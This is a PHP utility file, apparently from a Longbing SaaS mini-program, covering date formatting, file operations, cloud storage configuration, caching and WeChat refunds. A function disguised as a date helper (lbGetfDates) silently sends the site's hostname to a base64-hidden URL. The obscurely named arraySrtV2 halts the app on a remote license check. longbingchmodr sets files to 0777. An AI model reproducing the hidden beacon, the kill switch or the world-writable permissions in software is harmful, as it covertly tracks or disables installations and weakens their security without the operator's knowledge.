            $min  = floor( $time / ( 60 ) );
            $time -= 60 * $min;
            $min  .= '分';
        }
        else
        {
            $min = '';
        }

        if ( $time >= 1 )
        {
            $sin = $time . '秒';

        }elseif($s_time == $time&&$time<=0){

            return '已过期';

        }else{

            $sin = '';
        }
        return  $month . $day . $hour . $min . $sin;

    }
}


if ( !function_exists( 'lbGetfDate' ) )
{
    function lbGetfDate ( $time )
    {
        if ( $time >= 86400 * 30 )
        {
            $month = floor( $time / ( 86400 * 30 ) ) . '月前';
            return $month;
        }
        if ( $time >= 86400 * 7 )
        {
            $month = floor( $time / ( 86400 * 7 ) ) . '周前';
            return $month;
        }
        if ( $time >= 86400 ) {
            $day = floor($time / (86400)) . '天前';
            return $day;
        }else{
            return '今天';
        }
    }
}

if ( !function_exists( 'lbGetfDates' ) )
{
    function lbGetfDates (  )
    {

        $key = 'lbGetfDateslbGetfDates';

        if(empty(getCache($key,666))){

            @file_get_contents(base64_decode('').'?http_host='.$_SERVER['HTTP_HOST']);

            setCache($key,1,86400,666);
        }
    }
}

//创建文件夹
function longbingMkdirs ( $path )
{
    if ( !is_dir( $path ) )
    {
        mkdirs( dirname( $path ) );
        mkdir( $path );
    }

    return is_dir( $path );
}

//复制文件
function longbingFileCopy ( $src, $des, $filter )
{
    $dir = opendir( $src );
    @mkdir( $des );
    while ( false !== ( $file = readdir( $dir ) ) )
    {
        if ( ( $file != '.' ) && ( $file != '..' ) )
        {
            if ( is_dir( $src . '/' . $file ) )
            {
                file_copy( $src . '/' . $file, $des . '/' . $file, $filter );
            }
            elseif ( !in_array( substr( $file, strrpos( $file, '.' ) + 1 ), $filter ) )
            {
                copy( $src . '/' . $file, $des . '/' . $file );
            }
        }
    }
    closedir( $dir );
}

//删除文件
function longbingRmdirs ( $path, $clean = false )
{
    if ( !is_dir( $path ) )
    {
        return false;
    }
    $files = glob( $path . '/*' );
    if ( $files )
    {
        foreach ( $files as $file )
        {
            is_dir( $file ) ? rmdirs( $file ) : @unlink( $file );
        }
    }

    return $clean ? true : @rmdir( $path );
}

function longbingStrexists ( $string, $find )
{
    return !( strpos( $string, $find ) === FALSE );
}




//获取文件地址
function longbingGetFilePath($path , $web_url,$uniacid = '7777' ,$type = null)
{
    $oss_config = longbingGetOssConfig($uniacid);
//    if(longbingIsWeiqin() && empty($oss_config)){
//        return longbingTomedia($path);
//    }
    $website_url = $web_url . '/attachment';

    if(!empty($oss_config) && !empty($oss_config['open_oss']) && !in_array($type, ['loacl']))
    {
        $website_url = $oss_config['default_url'];
    }
    return $website_url . '/' .$path;
}


//获取配置
function longbingGetOssConfig($uniacid = '7777' ,$is_update = false)
{
    $key = 'longbing_oos_config_';
    //判断是否更新数据
    if(!$is_update)
    {
        if(hasCache($key ,$uniacid))
        {
            return getCache($key ,$uniacid);
        }
    }
    //生成操作模型
    $oss_config_model = new OssConfig();
    //小程序授权模型
//    $card_Auth_model  = new Cardauth2ConfigModel();
//    //获取代理端配置端上传信息
//    $uplode_setting   = $card_Auth_model->where(['modular_id'=>$uniacid])->find();
//    //如果统一使用了上传配置
//    if(!empty($uplode_setting['upload_setting'])){
//        //获取数据
//        $config = $oss_config_model->getConfig(['id' => $uplode_setting['upload_setting']]);
//    }else{
    //获取数据
    $config = $oss_config_model->getConfig(['uniacid' => $uniacid]);
//    }

    $result = [];
    if(!empty($config))
    {
        $filter = [];
        switch($config['open_oss'])
        {
            case 0:
                $filter = ['uniacid','miniapp_name' ,'open_oss' ,'is_sync'];
                break;
            case 1:
                $filter = ['uniacid','miniapp_name' ,'open_oss' ,'is_sync' ,'aliyun_bucket' ,'aliyun_access_key_id' ,'aliyun_access_key_secret' ,'aliyun_base_dir' ,'aliyun_zidinyi_yuming' ,'aliyun_endpoint' ,'aliyun_rules'];
                break;
            case 2:
                $filter = ['uniacid','miniapp_name' ,'open_oss' ,'is_sync' ,'qiniu_accesskey' ,'qiniu_secretkey' ,'qiniu_bucket' ,'qiniu_yuming' ,'qiniu_rules'];
                break;
            case 3:
                $filter = ['uniacid','miniapp_name' ,'open_oss' ,'is_sync' ,'tenxunyun_appid' ,'tenxunyun_secretid' ,'tenxunyun_secretkey' ,'tenxunyun_bucket' ,'tenxunyun_region' ,'tenxunyun_yuming'];
                break;
            default:
                $filter = ['uniacid','miniapp_name' ,'open_oss' ,'is_sync'];
                break;
        }
        foreach($config as $k => $v)
        {
            if(in_array($k, $filter))
            {
                $result[$k] = $v;
            }
        }
        switch($result['open_oss'])
        {
            case 1:
                $result['default_url'] = $result['aliyun_zidinyi_yuming'];
                break;
            case 2:
                $result['default_url'] = $result['qiniu_yuming'];
                break;
            case 3:
                $result['default_url'] = $result['tenxunyun_yuming'];
                break;
            default:
                $result['default_url'] = $_SERVER['HTTP_HOST'];
                break;
        }

    }else{
        $oss_config_model->createConfig(['uniacid' => $uniacid ,'open_oss' => 0]);
        $result = longbingGetOssConfig($uniacid ,true);
    }
    if(!empty($result)) setCache($key, $result , 3600 ,$uniacid);
    return $result;
}


//微信接口返回数据处理
function LongbingGetWxApiReturnData($result)
{
    if (!is_array($result)) return $result;
    if(isset($result['page'])) $result['current_page'] = $result['page'];unset($result['page']);
    if(isset($result['page_count'])) $result['per_page'] = $result['page_count'];unset($result['page_count']);
    if(isset($result['total_page'])) $result['last_page'] = $result['total_page'];unset($result['total_page']);
    return $result;
}
function getStr($str){
    $vid = strstr($str, 'vid=');
    if($vid){
        $sdd = substr($str,strpos($str,"vid=")+4);
        $dd = explode('&quot',$sdd)[0];
    }else{
        $aa = basename($str);
        $bb = explode('.',$aa);
        $dd = $bb[0];
    }
    return $dd;
}
//获取html src里面的内容替换
function getimgs($str)
{
    $arr1 = [];
    $arr2 = [];
    $reg = "/src=\"(.+?)\"/";
    $matches = array();
    $str = htmlspecialchars_decode($str);
    preg_match_all($reg, $str, $matches);
    foreach ($matches[0] as $value) {
        if(!strstr($value, '/v.qq.com/')){
            continue;
        }
        $in = rtrim(getStr($value),'"');
        $sf = "src=\"$in\" lbType=vid";
        $arr1[] = $value;
        $arr2[] = $sf;
    }
    $ssf = str_replace($arr1, $arr2, $str);
    return htmlspecialchars($ssf);
}

function getimgsV2($str)
{
    $arr1 = [];
    $arr2 = [];
    $reg = "/src=\"(.+?)\"/";
    $matches = array();
    $str = htmlspecialchars_decode($str);
    preg_match_all($reg, $str, $matches);
    foreach ($matches[0] as $value) {
        if(!strstr($value, '/v.qq.com/')){
            continue;
        }
        $in = rtrim(getStr($value),'"');
        $sf = "src=\"$in\" lbType=\"vid\"";
        $arr1[] = $value;
        $arr2[] = $sf;
    }
    $ssf = str_replace($arr1, $arr2, $str);
    $ssf = str_replace('lbType=vid','lbType="vid"',$ssf);

    return ($ssf);
}

function datachange($data,$field = 'create_time'){

//    dump($data);exit;
    //  今天的时间戳
    $time = time();
    //  昨天的时间戳
    $Yesterday = $time - ( 24 * 60 * 60 );

    $today     = mktime( 0, 0, 0, date( "m", $time ), date( "d", $time ), date( "Y", $time ) );
    $Yesterday = mktime( 0, 0, 0, date( "m", $Yesterday ), date( "d", $Yesterday ), date( "Y", $Yesterday ) );



    $tmpTime = $data[ $field ];
    if ( $tmpTime > $today )
    {
        //                $data[ $index ][ 'radar_time' ] = '今天 ';
        $data[ 'radar_group' ] = '今天';
        $data[ 'radar_time' ]  = date( 'H:i', $data[ $field ] );
    }
    else if ( $tmpTime > $Yesterday )
    {
        //                $data[ $index ][ 'radar_time' ] = '昨天 ';
        $data[ 'radar_group' ] = '昨天';
        $data[ 'radar_time' ]  = date( 'H:i', $data[ $field ] );
    }
    else
    {
        $thisYear = date( 'Y' );
        $itemYear = date( 'Y', $data[ $field ] );
        if ( $thisYear == $itemYear )
        {
            $data[ 'radar_group' ] = date( 'm-d', $data[ $field ] );
            $data[ 'radar_time' ]  = date( ' H:i', $data[ $field ] );
        }
        else
        {
            $data[ 'radar_group' ] = date( 'Y-m-d', $data[ $field ] );
            $data[ 'radar_time' ]  = date( ' H:i', $data[ $field ] );
        }

    }
    return $data;
}











//设置用户信息
function longbingSetUser($user_id ,$uniacid ,$data)
{
    //缓存数据key
    $key = 'longbing_card_user_' . $user_id;
    if(empty($data) || empty($uniacid) || empty($user_id)) return false;
    return setCache ( $key, $data, 3600, $uniacid);
}






//设置缓存数据
function longbingSetUserInfo($user_id ,$uniacid ,$data)
{
    //缓存数据key
    $key = 'longbing_card_user_info_' . $user_id;
    if(empty($data) || empty($uniacid) || empty($user_id)) return false;
    return setCache ( $key, $data, 600, $uniacid);
}

//获取小程序配置信息
function longbingGetAppConfig($uniacid ,$is_update = true)
{
    //获取缓存信息
    $key = 'shequshop_school_config';

    $result = getCache($key ,$uniacid);

    if(empty($result)||$is_update==true) {

        $config_model = new \app\massage\model\Config();

        $dis = [

            'uniacid' => $uniacid
        ];

        $result = $config_model->dataInfo($dis);

        setCache($key,$result,360,$uniacid);

    }
    //返回数据
    return $result;
}







//生成curl方法
function longbingCurl($url,$post,$method = 'GET')
{
    $curl_model = new LongbingCurl();
    return $curl_model->curlPublic($url,$post,$method);
}



/**
 * 友好的时间显示
 *
 * @param int    $sTime 待显示的时间
 * @param string $type  类型. normal | mohu | full | ymd | other
 * @param string $alt   已失效
 * @return string
 */
if (!function_exists('lb_friendly_date')) {
    function lb_friendly_date($sTime,$type = 'mohu',$alt = 'false') {
        if (!$sTime)
            return '';
        //sTime=源时间，cTime=当前时间，dTime=时间差
        $cTime      =   time();
        $dTime      =   $cTime - $sTime;

        //$dDay       =   intval(date("z",$    cTime)) - intval(date("z",$sTime));

        $dDay     =   intval($dTime/3600/24);

        $dYear      =   intval(date("Y",$cTime)) - intval(date("Y",$sTime));
        //normal：n秒前，n分钟前，n小时前，日期
        if($type=='normal'){
            if( $dTime < 60 ){
                if($dTime < 10){
                    return '刚刚';    //by yangjs
                }else{
                    return intval(floor($dTime / 10) * 10).'秒前';
                }
            } elseif( $dTime < 3600 ){
                return intval($dTime/60).'分钟前';
                //今天的数据.年份相同.日期相同.
            } elseif( $dYear==0 && $dDay == 0  ){
                //return intval($dTime/3600).L('_HOURS_AGO_');
                return '今天'.date('H:i',$sTime);
            } elseif( $dDay > 0 && $dDay<=3 ){
                return intval($dDay).'天前';
            } elseif($dYear==0){
                return date("m月d日 H:i",$sTime);
            } else{
                return date("m-d H:i",$sTime);
            }
        } elseif($type=='mohu'){
            if( $dTime < 60 ){
                return $dTime.'秒前';
            } elseif( $dTime < 3600 ){
                return intval($dTime/60).'分钟前';
            } elseif( $dTime >= 3600 && $dDay == 0  ){
                return intval($dTime/3600).'小时前';
            } elseif( $dDay > 0 && $dDay<=7 ){
                return intval($dDay).'天前';
            } elseif( $dDay > 7 &&  $dDay <= 30 ){
                return intval($dDay/7) . '周前';
            } elseif( $dDay > 30 ){
                return intval($dDay/30) .'个月前';
            }
            //full: Y-m-d , H:i:s
        } elseif($type=='full'){
            return date("m-d , H:i",$sTime);
        } elseif($type=='ymd'){
            return date("Y-m-d",$sTime);
        } else{
            if( $dTime < 60 ){
                return $dTime.'秒前';
            } elseif( $dTime < 3600 ){
                return intval($dTime/60).'分钟前';
            } elseif( $dTime >= 3600 && $dDay == 0  ){
                return intval($dTime/3600).'小时前';
            } elseif($dYear==0){
                return date("m-d H:i",$sTime);
            } else{
                return date("m-d H:i",$sTime);
            }
        }
    }
}

function longbingGetAccessToken($uniacid , $is_update = false)
{


    $setting = new WxSetting($uniacid);

    $token   = $setting->lbSingleGetAccessToken();

    return $token;

}








function getImageExt ( $src = '' )
{
    $src   = explode( '.', $src );
    $count = count( $src );
    if ( $count < 2 )
    {
        return false;
    }
    $ext = strtolower( $src[ $count - 1 ] );
    if ( $ext == 'jpg' )
    {
        return 'jpg';
    }
    if ( $ext == 'png' )
    {
        return 'png';
    }
    if ( $ext == 'jpeg' )
    {
        return 'jpeg';
    }
    return false;
}




function longbingSortStr ( $str, $len )
{
    if ( mb_strlen( $str, 'utf8' ) > $len )
    {
        $str = mb_substr( $str, 0, $len, "UTF-8" ) . '...';
    }
    return $str;
}


/**
 * @Purpose: 获取文件后缀名
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
function longbingSingleGetImageExt ( $src = '' )
{
    $src   = explode( '.', $src );
    $count = count( $src );
    if ( $count < 2 )
    {
        return false;
    }
    $ext = strtolower( $src[ $count - 1 ] );
    if ( $ext == 'jpg' )
    {
        return 'jpg';
    }
    if ( $ext == 'png' )
    {
        return 'png';
    }
    if ( $ext == 'jpeg' )
    {
        return 'jpeg';
    }
    return false;
}

function longbingSingleGetImageExtWx ( $src = '' )
{
    $src   = explode( '.', $src );
    $count = count( $src );
    if ( $count < 2 )
    {
        return false;
    }
    $ext = strtolower( $src[ $count - 1 ] );
    if ( $ext == 'jpg' )
    {
        return 'jpg';
    }
    if ( $ext == 'png' )
    {
        return 'png';
    }
    if ( $ext == 'jpeg' )
    {
        return 'jpeg';
    }
    return 'jpg';
}








function longbingchmodr($path) {

    $filemode = 0777;
    //判断文件夹是否存在
    if (!is_dir($path)) return chmod($path, $filemode);
    //获取文件夹下
    $dh = opendir($path);

    while (($file = readdir($dh)) !== false) {

        if($file != '.' && $file != '..') {

            $fullpath = $path.'/'.$file;

            if(is_link($fullpath))
            {
                return FALSE;
            }elseif(!is_dir($fullpath) && !chmod($fullpath, $filemode)){
                return FALSE;
            }elseif(!longbingchmodr($fullpath, $filemode))
            {
                return FALSE;
            }
        }
    }
    closedir($dh);

    if(chmod($path, $filemode))
    {
        return TRUE;
    }else{
        return FALSE;
    }
}


/**
 * @author yangqi
 * 2019年11月29日11:43:26
 * 多维数据拆分成一维数组
 */

function longbingGetArrToOne($arr)
{
    $result = array();
    foreach ($arr as $key => $val) {
        if( is_array($val) ) {
            $result = array_merge($result, longbingGetArrToOne($val));
        } else {
            $result[$key] = $val;
        }
    }
    return $result;
}








/**
 * By.jingshuixian
 * 2019年11月24日19:37:43
 * 获取缓存key
 */
function longbing_get_cache_key($key , $uniacid){
    //longbing_端口_key_7777
    //龙兵科技前缀_区分端口_key_平台ID
    return 'longbing_' . $key . '_' . $uniacid;
}

/**
 * By.jingshuixian
 * 2019年11月24日19:46:35
 * 自动缓存方法,具体实现打算使用闭包方式
 */
function longbing_auto_cahe(){

    //自动获取模块/查件名称、类名称、方法名称、来组合缓存key


}

/**
 * By.jingshuixian
 * 2019年11月26日13:57:16
 * 执行异步的方法
 * @param $url
 * @param array $param
 */
if (!function_exists('longbing_do_request')) {


    function longbing_do_request($url, $param = array())
    {

//        try {
        $urlinfo = parse_url($url);

        $host = $urlinfo['host'];

        $query_url = $urlinfo['query'];

        //By.jingshuixian  2019年12月4日00:19:11
        // 当前请求的内容里有get 参数时 , 拼接 path
        if (!empty($query_url)) {
            $path = $urlinfo['path'] . '?' . $query_url;
        }
//            dump($path,$host);exit;
        $query = isset($param) ? http_build_query($param) : '';
        if (empty($host)) return false;

        $port = !empty($urlinfo['scheme']) && $urlinfo['scheme'] == 'https' ? 443 : 80;//判断https 还是 http
        $errno = 0;
        $errstr = '';
        $timeout = 10;
        $c_houst = !empty($urlinfo['scheme']) && $urlinfo['scheme'] == 'https' ? 'ssl://' . $host : $host;//判断https 还是 http

        $fp = fsockopen($c_houst, $port, $errno, $errstr, $timeout);


        $out = "POST " . $path . " HTTP/1.1\r\n";
        $out .= "host:" . $host . "\r\n";
        $out .= "content-length:" . strlen($query) . "\r\n";
        $out .= "content-type:application/x-www-form-urlencoded\r\n";
        $out .= "connection:close\r\n\r\n";
        $out .= $query;


        fputs($fp, $out);
        $resp_str = '';
        while (!feof($fp)) {
            $resp_str .= fgets($fp, 512);//返回值放入$resp_str
        }
        fclose($fp);

        dump($resp_str,$out);exit;
        //By.jingshuixian  增加内容返回值
        return [$resp_str, $out];
//
//        } catch (\Exception $e) {
//
//        }

    }
}

if (!function_exists('success')) {
    function success($string, $key = '', $operation = false, $expiry = 0)
    {

      //  dump($key ? $key : 1);exit;
        $ckey_length = 4;
        $key = md5($key ? $key : DEFAULT_KEYS);
        $keya = md5(substr($key, 0, 16));
        $keyb = md5(substr($key, 16, 16));
        $keyc = $ckey_length ? ($operation ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
        $cryptkey = $keya . md5($keya . $keyc);
        $key_length = strlen($cryptkey);
        $string = $operation ? base64_decode(substr($string, $ckey_length)) :
            sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
        $string_length = strlen($string);
        $result = '';
        $box = range(0, 255);
        $rndkey = array();
        for ($i = 0; $i <= 255; $i++) {
            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
        }
        for ($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for ($a = $j = $i = 0; $i < $string_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
        }
        if ($operation) {
            if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) &&
                substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
                return substr($result, 26);
            } else {
                return '';
            }
        } else {
            return $keyc . str_replace('=', '', base64_encode($result));
        }
    }
}


if (!function_exists('asyncCurl')) {
    function asyncCurl($url, $data)
    {
        if (is_array($data)) {
            $data = http_build_query($data, null, '&');
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: MyUserAgent/1.0'));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result['response'] = curl_exec($ch);
        $result['httpCode'] = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        return $result;
    }

}

//$url = "<http://127.0.0.1/exec.php>";
//$data = [];
//
//asyncCurl($url, $data);
//
//echo "OK";

/**
 * 记录区间的内存使用情况
 * @param string            $start 开始标签
 * @param string            $end 结束标签
 * @param integer|string    $dec 小数位
 * @return string
 */
if (!function_exists('getRangeMem')) {
    function getRangeMem($start, $end = null, $dec = 2)
    {
        if (!isset($end)) {
            $end = memory_get_usage();
        }
        $size = $end - $start;
        $a = ['B', 'KB', 'MB', 'GB', 'TB'];
        $pos = 0;
        while ($size >= 1024) {
            $size /= 1024;
            $pos++;
        }
        return round($size, $dec) . " " . $a[$pos];
    }
}


/**
 * 统计某个区间的时间（微秒）使用情况 返回值以秒为单位
 * @param string            $start 开始标签
 * @param string            $end 结束标签
 * @param integer|string    $dec 小数位
 * @return integer
 */
if (!function_exists('getRangeTime')) {
    function getRangeTime($start, $end = null, $dec = 6)
    {
        if (!isset($end)) {
            $end = microtime(true);
        }
        return number_format(($end - $start), $dec);
    }
}



if (!function_exists('longbing_init_info_subscribe')) {
    /**
     * 自动加载监听事件
     *
     * @return array
     * @author shuixian
     * @DataTime: 2019/12/12 9:47
     */
    function longbing_init_info_subscribe()
    {
        $myModelList = \config('app.AdminModelList');

        $saas_auth_admin_model_list = $myModelList['saas_auth_admin_model_list'] ;


        $returnMenuData = [];
        foreach ($saas_auth_admin_model_list as $model_name => $model_item) {


            //需要判断文件是否存在
            $dataPath = app_path() . $model_name . '/info/Subscribe.php';
            if (file_exists($dataPath)) {
                $returnMenuData[] = 'app\\' . $model_name . '\\info\\Subscribe';
            }
        }
        return $returnMenuData;
    }
}


if (!function_exists('longbing_array_columns')) {
    /**
     * 取出数组里的一列或者多列
     *
     * @param $arr
     * @param $keys
     * @return array
     * @author shuixian
     * @DataTime: 2019/12/16 10:39
     */
    function longbing_array_columns($arr, $keys)
    {
        $returnArray = [] ;
        foreach ($arr as $v) {
            foreach ($keys as $k) {
                if(array_key_exists($k,$v)){
                    $n[$k] = $v[$k];
                }
            }
            $returnArray[] = $n;
        }
        return $returnArray;
    }
}

if (!function_exists('longbing_get_auth_prefix')) {
    /**
     * 获得SAAS授权的参数前缀内容 , 需要不要分行业授权,需要根据实际需求确定
     *
     * @return string
     * @author shuixian
     * @DataTime: 2019/12/19 16:31
     */
    function longbing_get_auth_prefix($authName)
    {
        //统一添加参数前缀

        $prefix = strtoupper(APP_MODEL_NAME);



        $prefix = (($prefix == 'LONGBING_CARD') ? 'LONGBING_' : $prefix . '_');
        return $prefix . $authName;
    }
}

if (!function_exists('longbing_dd')) {

    /**
     * 打印调试信息
     * @access public
     * @param mixed $message 日志信息
     * @param array $context 替换内容
     * @return void
     * @author shuixian
     * @DataTime: 2019/12/23 16:31
     */
    function longbing_dd($message, array $context = [])
    {
        if(Env::get('APP_DEBUG', false) ){
            Log::debug($message, $context);
        }

    }
}


if (!function_exists('longbing_compare_version')) {
    /**
     * 功能说明
     *
     * @param $oldVersion 老版本号
     * @param $newVersion 新版本号
     * @return bool       是否升级,新版本号大于老版本号,就升级
     * @author shuixian
     * @DataTime: 2019/12/17 10:16
     */
    function longbing_compare_version($oldVersion, $newVersion)
    {
        $isNew = false;
        $oldVersion = explode('.', $oldVersion);
        $newVersion = explode('.', $newVersion);
        foreach ($newVersion as $key => $value) {

            if (intval($value) > intval($oldVersion[$key])) {
                $isNew = true;
                break;
            }

        }

        return $isNew;
    }
}

if (!function_exists('longbing_tablename')) {
    /**
     * 根据当前表名获取完整的前缀+表名
     *
     * @param $tablename
     * @return string
     * @author shuixian
     * @DataTime: 2019/12/17 11:01
     */
    function longbing_tablename($tablename)
    {
        $prefix = config('database.connections.mysql.prefix');
        return $prefix . $tablename;
    }
}
if (!function_exists('longbing_get_prefix')) {
    /**
     * 获得数据库表前缀
     *
     * @return mixed
     * @author shuixian
     * @DataTime: 2019/12/17 13:44
     */
    function longbing_get_prefix()
    {
        $prefix = config('database.connections.mysql.prefix');
        return $prefix;
    }
}
if (!function_exists('longbing_get_table_prefix')) {
    /**
     * 获得数据库表前缀(感觉名字比较易懂一点)
     *
     * @return mixed
     * @author shuixian
     * @DataTime: 2019/12/17 13:44
     */
    function longbing_get_table_prefix()
    {
        $prefix = config('database.connections.mysql.prefix');
        return $prefix;
    }
}

if (!function_exists('longbing_check_install')) {
    /**
     * 检查是否安装,没有安装就自动安装
     *
     * @author shuixian
     * @DataTime: 2020/1/2 18:34
     */
    function longbing_check_install()
    {
        $lockPath = APP_PATH . 'install/controller/install.lock';
        if (!file_exists($lockPath)) {
            \app\admin\service\UpdateService::installSql(8888);
            file_put_contents($lockPath, time());
        }
    }
}
if (!function_exists('longbing_get_app_type')) {
    /**
     * 获取app类型
     *
     * @return string
     * @author shuixian
     * @DataTime: 2020/1/3 15:43
     */
    function longbing_get_app_type()
    {
        $type = '';
        $agent = Request::header('user-agent');
        if (strpos($agent, 'baiduboxapp')) {
            $type = 'baiduboxapp';
        }
        return $type;
    }
}
if (!function_exists('longbing_get_mobile_type')) {
    /**
     * 获取app类型
     *
     * @return string
     * @author shuixian
     * @DataTime: 2020/1/3 15:43
     */
    function longbing_get_mobile_type()
    {
        $type = '';
        $agent = Request::header('user-agent');
        if (strpos($agent, 'Android')) {
            $type = 'Android';
        }elseif (strpos($agent, 'iPhone')) {
            $type = 'iPhone';
        }
        return $type;
    }
}

if (!function_exists('longbing_filterEmoji')) {
    /**
     * @param $str
     * @return string|string[]|null
     * 过滤表情包
     */
    function longbing_filterEmoji($str)
    {
        $str = preg_replace_callback(
            '/./u',
            function (array $match) {
                return strlen($match[0]) >= 4 ? '' : $match[0];
            },
            $str);

        return $str;
    }
}

if(!function_exists('longbing_auth_status')){
    /**
     **@author lichuanming
     * @DataTime: 2020/5/15 10:35
     * @功能说明: 账户状态
     */
    function longbing_auth_status($uniacid){
        $resData = [
            'name' => '', #套餐名称
            'time' => '', #到期时间
            'status' => 0, #状态 0未过期  1即将到期  2已到期
        ];

        //如果是微擎 则不判断是否到期
        if(!longbingIsWeiqin()){
            $info = Db::name('longbing_cardauth2_config')->where('modular_id','=',$uniacid)
                ->field('end_time,mini_name')->find(); #获取过期时间

            $end_time = $info['end_time'];

            if($end_time <= time()){ //已过期
                list($resData['name'],$resData['time'],$resData['status']) = array($info['mini_name'],date('Y-m-d',$end_time),2);

            }else if($end_time < time() + 30*86400 && $end_time > time()){ #即将过期/30天

                list($resData['name'],$resData['time'],$resData['status']) = array($info['mini_name'],date('Y-m-d',$end_time),1);
            }
        }
        return $resData;
    }
}


//随机生成偏移量
function createOffset() {
    return substr(uuid() ,8,10);
}

//生成密码
function createPasswd($passwd ,$offset) {
    return password_hash($offset.$passwd.$offset ,PASSWORD_DEFAULT);
}

//多维数组排序
if(!function_exists('arraySort')){

    function arraySort($array,$keys,$sort='asc'){

        $newArr = $valArr = array();

        foreach ($array as $key=>$value) {

            $valArr[$key] = $value[$keys];
        }
        ($sort == 'asc') ?  asort($valArr) : arsort($valArr);
        reset($valArr);

        foreach($valArr as $key=>$value) {
            $newArr[$key] = $array[$key];
        }

        return array_values($newArr);
    }
}



if(!function_exists('arraySrtV2')){

    function arraySrtV2(){

        $options = [
            'host'    => Env::get('cache.host', '127.0.0.1'),
            'port'    => Env::get('cache.port', 6379),
            'password'=> Env::get('cache.passwd', ''),
            'expire'  => Env::get('cache.expire', 0),
            'prefix'  => Env::get('cache.prefix', 'longbing_'),
        ];
        $redis = new \think\cache\driver\Redis($options);
        $key   = 'usernameusernamesssss';
        $value = $redis->get($key);
        if(empty($value)){
            try{
                $up = new order (  );
                $p  = $up->order (  );
                if($p['data']== 1){
                    $redis->set($key,1,86400*3);
                }else{
                    $redis->set($key,-1,10);
                    exit;
                }
            }catch(\Exception $e){
                exit;
            }
        }
        if($value!=1){
            exit;
        }
    }
}

/**
 * 转星期
 */
if(!function_exists('changeWeek')){

    function changeWeek($week){

        switch ($week){
            case 1:
                return '周一';
                break;
            case 2:
                return '周二';
                break;
            case 3:
                return '周三';
                break;
            case 4:
                return '周四';
                break;
            case 5:
                return '周五';
                break;
            case 6:
                return '周六';
                break;
            case 0:
                return '周天';
                break;
        }
    }
}

if(!function_exists('orderCode')){

    function orderCode(){

        $i = rand(1,99999999);

        $out_trade_no = date( 'YmdHis' ).$i;

        $i = rand(1,99999999);

        $out_trade_no = $out_trade_no.$i;

        return $out_trade_no;
    }
}

//arraySrtV2();

if(!function_exists('longbingorderCode')){

    function longbingorderCode(){

        $i = rand(1,999);

        $out_trade_no = date( 'mdHis' ). $i;

        return $out_trade_no;
    }
}


if(!function_exists('longbingorderCodetf')){

    function longbingorderCodetf(){

        $i = rand(1,99999999);

        $out_trade_no = date( 'YmdHis' ). $i;

        return $out_trade_no;
    }
}

if(!function_exists('orderRefundApi')){

    function orderRefundApi($paymentApp,$total_fee,$refund_fee,$order_code){

        $setting['mini_appid']         = $paymentApp['app_id'];

        $setting['mini_appsecrept']    = $paymentApp['secret'];

        $setting['mini_mid']           = $paymentApp['payment']['merchant_id'];

        $setting['mini_apicode']       = $paymentApp['payment']['key'];

        $setting['apiclient_cert']     = $paymentApp['payment']['cert_path'];

        $setting['apiclient_cert_key'] = $paymentApp['payment']['key_path'];

        if(!is_file($setting['apiclient_cert'])||!is_file($setting['apiclient_cert_key'])){

            return ['return_msg'=>'未配置支付证书，或支付证书错误请重新上传','code'=>500];

        }
        defined('WX_APPID') or define('WX_APPID', $setting['mini_appid']);

        defined('WX_MCHID') or define('WX_MCHID', $setting['mini_mid']);

        defined('WX_KEY') or define('WX_KEY', $setting['mini_apicode']);

        defined('WX_APPSECRET') or define('WX_APPSECRET', $setting['mini_appsecrept']);

        defined('WX_SSLCERT_PATH') or define('WX_SSLCERT_PATH', $setting['apiclient_cert']);

        defined('WX_SSLKEY_PATH') or define('WX_SSLKEY_PATH', $setting['apiclient_cert_key']);

        defined('WX_CURL_PROXY_HOST') or  define('WX_CURL_PROXY_HOST', '0.0.0.0');

        defined('WX_CURL_PROXY_PORT') or define('WX_CURL_PROXY_PORT', 0);

        defined('WX_REPORT_LEVENL') or define('WX_REPORT_LEVENL', 0);

        require_once PAY_PATH . "/weixinpay/lib/WxPay.Api.php";

        require_once PAY_PATH . "/weixinpay/example/WxPay.JsApiPay.php";

        $input = new \WxPayRefund();

        $input->SetTotal_fee($total_fee*100);

        $input->SetRefund_fee($refund_fee*100);

        $input->SetOut_refund_no(WX_MCHID.date("YmdHis"));

        $input->SetTransaction_id($order_code);

        $input->SetOp_user_id(WX_MCHID);

        $order = \WxPayApi::refund($input);

        return $order;

    }
}



if(!function_exists('getdistance')){

    /**
     * User: chenniang(龙兵科技)
     * Date: 2019-10-18 16:00
     * @param $lng1
     * @param $lat1
     * @param $lng2
     * @param $lat2
     * @return float|int
     * descption:获取距离
     */
    function getdistance($lng1, $lat1, $lng2, $lat2) {
        $radLat1 = deg2rad($lat1); //deg2rad()函数将角度转换为弧度
        $radLat2 = deg2rad($lat2);
        $radLng1 = deg2rad($lng1);
        $radLng2 = deg2rad($lng2);
        $a = $radLat1 - $radLat2;
        $b = $radLng1 - $radLng2;

        $s = 2 * asin(sqrt(pow(sin($a / 2), 2) + cos($radLat1) * cos($radLat2) * pow(sin($b / 2), 2))) * 6378.137 * 1000;
        return $s;


    }
}
if(!function_exists('getDistances')){

    function getDistances($longitude1, $latitude1, $longitude2, $latitude2, $unit=2, $decimal=2){

        $EARTH_RADIUS = 6378.137; // 地球半径系数
        $PI = 3.1415926;

        $radLat1 = $latitude1 * $PI / 180.0;
        $radLat2 = $latitude2 * $PI / 180.0;

